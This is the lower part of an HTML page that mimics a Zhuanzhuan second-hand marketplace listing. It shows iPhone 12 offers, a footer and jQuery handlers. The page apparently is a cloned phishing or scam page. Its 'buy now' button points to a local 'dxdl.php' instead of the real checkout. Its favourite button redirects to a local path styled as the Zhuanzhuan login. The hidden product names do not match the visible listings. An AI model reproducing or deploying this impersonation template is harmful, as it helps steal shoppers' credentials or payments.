                                <div data-v-82002cb8="" data-metric="Yfx569sLekBQFjVU1TSjiA2928y56" data-areaexposure="111" data-info="{&quot;sortId&quot;:1,&quot;infoId&quot;:&quot;1407940785974051328&quot;}" zz-infoid="1407940785974051328" zz-sortid="1" data-isdot="0" zz-sortname="神舟 战神 K670D 15.6英寸 8GB 128G SSD+500G HDD GTX 1050 黑色" class="product-wrapper">
                                    <div data-v-82002cb8="" data-type="1" class="prod-pic"><img data-v-82002cb8="" src="img/e45373b8-1824-436e-a601-00a4591d888c.jpeg"></div>
                                    <div data-v-82002cb8="" class="pro-title">
                                        <div data-v-82002cb8="" class="label-list condition-single"><span data-v-82002cb8="" class="last condition">
                                                全新
                                            </span></div>
                                        iPhone 12下单送充电头蓝色128G国行
                                    </div>
                                    <ul data-v-82002cb8="" class="tag-list">
                                        <li data-v-82002cb8="">
                                            外观全新<span data-v-82002cb8=""></span></li>
                                        <li data-v-82002cb8="">
                                            功能完好<span data-v-82002cb8="" style="display: none;"></span></li>
                                    </ul>
                                    <div data-v-82002cb8="" class="price-info"><span data-v-82002cb8="" class="price"><em data-v-82002cb8="">¥</em>5479</span> <span data-v-82002cb8="" class="price-desc">到手价</span>
                                        <span data-v-82002cb8="" class="price-desc price-line"><em data-v-82002cb8="">¥</em>5599</span>
                                    </div>
                                    <div data-v-82002cb8="" class="seller-info"><img data-v-82002cb8="" src="img/39c0f2e9-331e-4da7-963d-b034c9b1567f.webp">优质货源旗舰店</div>
                                </div>
                                <div data-v-82002cb8="" data-metric="9O9zuWzQhdDHGezRhvh9gg2928y56" data-areaexposure="111" data-info="{&quot;sortId&quot;:2,&quot;infoId&quot;:&quot;1433685324089033728&quot;}" zz-infoid="1433685324089033728" zz-sortid="2" data-isdot="0" zz-sortname="ThinkPad X1 Carbon G6 14.0英寸 16GB 512G SSD Intel GMA UHD 620 黑色" class="product-wrapper">
                                    <div data-v-82002cb8="" data-type="1" class="prod-pic"><img data-v-82002cb8="" src="img/e73e9f22-673a-47bb-a412-0a8738033dbc.jpeg"></div>
                                    <div data-v-82002cb8="" class="pro-title">
                                        <div data-v-82002cb8="" class="label-list condition-single"><span data-v-82002cb8="" class="last condition">
                                                全新新
                                            </span></div>
                                        Apple iPhone12 Pro Max 5G 金色128G
                                    </div>
                                    <ul data-v-82002cb8="" class="tag-list">
                                        <li data-v-82002cb8="">
                                            外观全新<span data-v-82002cb8=""></span></li>
                                        <li data-v-82002cb8="">
                                            功能完好<span data-v-82002cb8="" style="display: none;"></span></li>
                                    </ul>
                                    <div data-v-82002cb8="" class="price-info"><span data-v-82002cb8="" class="price"><em data-v-82002cb8="">¥</em>8179</span> <span data-v-82002cb8="" class="price-desc">秒杀价</span>
                                        <span data-v-82002cb8="" class="price-desc price-line"><em data-v-82002cb8="">¥</em>8299</span>
                                    </div>
                                    <div data-v-82002cb8="" class="seller-info"><img data-v-82002cb8="" src="img/39c0f2e9-331e-4da7-963d-b034c9b1567f.webp">优质货源旗舰店</div>
                                </div>
                                <div data-v-82002cb8="" data-metric="MKk0Sh5zdyyAFd3Q9Nz6rQ2928y56" data-areaexposure="111" data-info="{&quot;sortId&quot;:3,&quot;infoId&quot;:&quot;1309380495284672202&quot;}" zz-infoid="1309380495284672202" zz-sortid="3" data-isdot="0" zz-sortname="E7500 
集显 
500G" class="product-wrapper">
                                    <div data-v-82002cb8="" data-type="1" class="prod-pic"><img data-v-82002cb8="" src="img/15528926-bc8b-4d4a-a4f1-5ccb6fa19c91.jpeg"></div>
                                    <div data-v-82002cb8="" class="pro-title">
                                        <div data-v-82002cb8="" class="label-list condition-single"><span data-v-82002cb8="" class="last condition">
                                                99新
                                            </span></div>
                                        Apple iPhone12 Pro Max 送充电头
                                    </div>
                                    <ul data-v-82002cb8="" class="tag-list">
                                        <li data-v-82002cb8="">
                                            外观完好<span data-v-82002cb8=""></span></li>
                                        <li data-v-82002cb8="">
                                            功能完好<span data-v-82002cb8="" style="display: none;"></span></li>
                                    </ul>
                                    <div data-v-82002cb8="" class="price-info"><span data-v-82002cb8="" class="price"><em data-v-82002cb8="">¥</em>8479</span> <span data-v-82002cb8="" class="price-desc">到手价</span> <span data-v-82002cb8="" class="price-desc price-line"><em data-v-82002cb8="">¥</em>8599</span></div>
                                    <div data-v-82002cb8="" class="seller-info"><img data-v-82002cb8="" src="img/39c0f2e9-331e-4da7-963d-b034c9b1567f.webp">优质货源旗舰店</div>
                                </div>
                            </div>
                            <div class="z-list__placeholder"></div>
                        </div>
                        <div data-v-82002cb8="" class="z-stance" style=""><img src="img/n_v24fc611d42e03423a9270f51e4a0c2b6c.png" onerror="this.src=&quot;https://img1.zhuanstatic.com/common/trade/img/message.png&quot;" class="z-stance__img">
                            <p class="z-stance__info">没有更多了</p>
                           <!---->
                       </div>
                   </div>
                   <!---->
               </div>

                 <!-- 悬浮吸引特效 -->

                <div class="z-toast z-toast--text" style="z-index: 2009;display: none;">
                    <div>收藏成功</div>
                </div>
                <!---->
                <div class="footer-fixed-wrap" data-v-eed7aa54="">
                    <div class="holder" data-v-eed7aa54=""></div>
                    <div zz-sectionid="102" class="footer-fixed" data-v-eed7aa54="">
                        <div class="main" data-v-eed7aa54="">
                            <div class="left-btn" data-v-eed7aa54="">
                                <a href="https://m.zhuanzhuan.com/system/zzappimservice/index.html?skillId=10063&amp;robot=92&amp;webview=zzn&amp;metric=hYB4hYpqtWeTHHPFjf9hhA110051p7&amp;clientid=yyj_pad_spxq_a&amp;infoId=1441625926157846016&amp;__tt=1633426442530">
                                    <div class="kf" data-v-eed7aa54=""><img src="img/kf.08c4df6.svg" alt="" class="icon" data-v-eed7aa54="">
                                        <p data-v-eed7aa54="">客服</p>
                                    </div>
                                </a>
                                <div class="like" data-v-eed7aa54=""><img src="img/want.0b1ed07.png" class="icon imgxin" data-v-eed7aa54="">
                                    <p data-v-eed7aa54="">收藏</p>
                                </div>



                            </div>
                            <div class="main-btn" data-v-eed7aa54="">

                                <a href="https://m.zhuanzhuan.com/u/bmmain/help/quick-understand?webview=zzn&amp;metric=hYB4hYpqtWeTHHPFjf9hhA110051p7&amp;type=Cplan&amp;couponId=1430001029486740553&amp;channel=BM_0291"><button zz-sortname="我也卖" zz-infoid="1442680054128313856" zz-url="https://m.zhuanzhuan.com/u/bmmain/helpsale/fast-type?channel=BM_0291A&amp;type=B&amp;__model=&amp;bmFrom=SXKM-AX&amp;cateId=1100000016" class="z-button z-button--default z-button--normal z-button--v8 z-button--hairline z-hairline--surround btn add-cart" data-v-eed7aa54=""><span class="z-button__text" data-v-eed7aa54=""><span class="z-button__text-main" data-v-eed7aa54=""><span data-v-eed7aa54="">
                                                    我也卖
                                                </span></span></span></button> </a>


                            <button onclick="location.href='dxdl.php';" zz-sortname="立即购买" zz-infoid="1442680054128313856" class="z-button z-button--default z-button--normal z-button--v8 z-button--hairline z-hairline--surround btn buy-now" data-v-eed7aa54=""><span class="z-button__text" data-v-eed7aa54=""><span class="z-button__text-main" data-v-eed7aa54=""><span data-v-eed7aa54="">
                                                <div data-v-eed7aa54="">立即购买</div>
                                            </span></span></span></button>





                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>



   <script type="text/javascript" src="js/jquery.min.js"></script>
   <script type="text/javascript" src="js/add.js"></script>
   <script>
       $(function($) {
           var pop = $(".pop-wrapper");
           $(".guarantee-line").click(function() {
               $(".z-overlay").removeClass('close');
               pop.removeClass('close');
               pop.animate({
                   'max-height': "86%",
               }, 100);
           })
           $(".pop_close").click(function() {
               $(".z-overlay").addClass('close');
               pop.animate({
                   'max-height': "0%",
               }, 100);

           })

           $("#xiangqing").on('click', '#show-btn', function() {

               if ($(this).hasClass("isShowFull")) {
                   $(".img-wrap").addClass("max-wrap");
                   $(this).text("展开全部")
                   $(this).removeClass(" isShowFull");
               } else {
                   $(".img-wrap").removeClass("max-wrap");
                   $(this).text("折叠")
                   $(this).addClass(" isShowFull");
               }

           });




           c = 0;
           $(".like").click(function() {

               if ($(".like").attr("num")) {

                   if (c % 2 == 0) {
                       $(".imgxin").attr("src", "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8CAMAAAANIilAAAAAYFBMVEUAAAD/VVX/XV3/VVX/V1f/XFz/ZWX/VVX/Vlb/VVX/VVX/VVX/VVX/Vlb/V1f/WVn/VVX/VVX/WVn/VVX/Vlb/Vlb/V1f/VVX/VVX/VVX/VVX/VVX/Vlb/Vlb/Wlr/VVUROAUpAAAAH3RSTlMA+A3wKRcG1oJWw72iaTISsYwc4Jx6O8pzW07oqZciDdY2BAAAATpJREFUSMft1tlugzAQheFjY2wIa1iyNpn3f8u2guLGmNTjXlSq8l2O9AsnGUfg5S/prj4oCYdUdrhB5kNPn4QZUyy6zEzTtkqxockSskSppnHdim/Tmz+/TKklKnwYhTM9YS2jtbZJC1optb91HQ15FE6dE0f50MqEWCrn0CxJw3+wted/YkvYdRuILV/inh+/YaaJr8esIz6BWU0R0t/Ed0zSmFhiJvhtgi+GH7fOakdejTu7FQ0WO25cIv5mCAVEP3qAxd2Ta4MHA/8+WtLwr6NVi9DWSKxUoYup4HELiy/wajl76dIBv/aILc2R8X+9Io/81pJPT57hOVlstyf8RJfkJ84IMPp344AguVi3vUKgw9VtdymCue8xew0GvWd/Vf7XMqPA1s1HLyVinARRckYktSs6vPwH75TgzCzoNcfEAAAAAElFTkSuQmCC")

                       $(".z-toast--text").show(100)

                       setTimeout(function() {
                           $(".z-toast--text").hide(100)
                       }, 1500)
                   } else {

                       $(".imgxin").attr("src", "https://img1.zhuanstatic.com/u/zyservice/static/img/want.0b1ed07.png")

                   }
                   ++c;
               } else {
                   location.href = "/zhuanzhuan.login?uid=43a2b95ec3cdd0d0278e43a2c6dbb46c&aid=269&infoId=1444862544416588800"
               }
           })



           setTimeout(function() {

               real = setInterval(function() {

                   var wid = $("#real").css("width");
                   $("#real").css({
                       "width": parseInt(wid) - 5 + "px",
                       "height": $("#real").height()
                   })
                   if (parseInt(wid) < 100) {
                       $("#real").css("width", "200px");
                       $("#real").hide();
                       clearInterval(real)
                   }
               }, 10)
           }, 2000)
       })
   </script>


</body>

</html>